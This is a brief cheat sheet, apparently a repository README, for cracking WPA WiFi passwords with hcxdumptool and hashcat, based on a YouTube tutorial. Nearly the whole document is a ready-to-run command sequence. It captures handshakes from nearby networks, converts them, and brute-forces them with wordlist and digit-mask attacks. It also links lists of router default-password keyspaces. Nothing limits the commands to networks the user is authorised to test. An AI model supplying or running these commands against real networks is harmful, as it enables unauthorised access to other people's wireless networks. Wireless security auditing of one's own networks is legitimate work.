# WiFi-Cracking-with-HashCat
Cat: Security

Hashcat wifi cracking from David Bombal's video

https://www.youtube.com/watch?v=Usw0IlGbkC4&t=915s

## COMMANDS
```
sudo systemctl stop NetworkManager && sudo systemctl stop wpa_supplicant

sudo hcxdumptool -i wlan0 -o dumpfile.pcapng --active_beacon --enable_status=1

sudo systemctl start wpa_supplicant && sudo systemctl start NetworkManager

hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng

hcxdumptool --do_rcascan -i wlan0

hashcat -m 22000 hash.hc22000 wordlist.txt
```
Windows:
hashcat.exe -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

hashcat.exe -m 22000 hash.hc22000 -a 3 --increment --increment-min 8 --increment-max 18 ?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d

Usefull repositories for routers with default passwords.

https://github.com/sheimo/Wifi-WPA-Keyspace-List

https://github.com/n0kovo/ssid-keyspace-table
